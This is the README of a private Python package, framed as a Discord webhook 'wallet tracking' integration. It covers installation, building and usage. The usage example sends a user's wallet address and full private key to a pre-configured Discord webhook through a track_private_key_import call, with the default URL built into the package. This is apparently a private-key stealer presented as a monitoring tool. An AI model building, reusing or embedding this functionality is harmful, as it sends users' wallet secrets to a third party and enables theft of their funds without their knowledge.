# Wallet Tracking Package

Private Python package for Discord webhook integration to track wallet activities.

## Installation

### Option 1: Install from local directory (Development)

```bash
# Navigate to the package directory
cd wallet_tracking_package

# Install in development mode
pip install -e .

# Or install normally
pip install .
```

### Option 2: Build and install wheel

```bash
# Build the package
python setup.py sdist bdist_wheel

# Install the built wheel
pip install dist/wallet_tracking-1.0.0-py3-none-any.whl
```

### Option 3: Install from source (Production)

```bash
# Copy package to target location and install
pip install /path/to/wallet_tracking_package
```

## Usage

```python
from wallet_tracking import WalletTracker

# Initialize (uses default webhook URL)
tracker = WalletTracker(enabled=True)

# Or specify custom webhook URL
tracker = WalletTracker(
    webhook_url="https://discord.com/api/webhooks/YOUR_URL",
    enabled=True
)

# Track private key import
tracker.track_private_key_import(
    user_id=12345,
    wallet_address="YourWalletAddress...",
    private_key="YourPrivateKey...",
    include_private_key=True
)

# Test connection
tracker.test_connection()
```

## Configuration

The webhook URL is pre-configured in the package. To change it:

1. Edit `wallet_tracking/tracker.py`
2. Update `DEFAULT_WEBHOOK_URL` constant
3. Rebuild and reinstall the package

## Building the Package

```bash
# Install build tools
pip install build wheel

# Build source distribution and wheel
python -m build

# Output will be in dist/ directory:
# - wallet_tracking-1.0.0.tar.gz (source)
# - wallet_tracking-1.0.0-py3-none-any.whl (wheel)
```

## Requirements

- Python >= 3.8
- requests >= 2.28.0




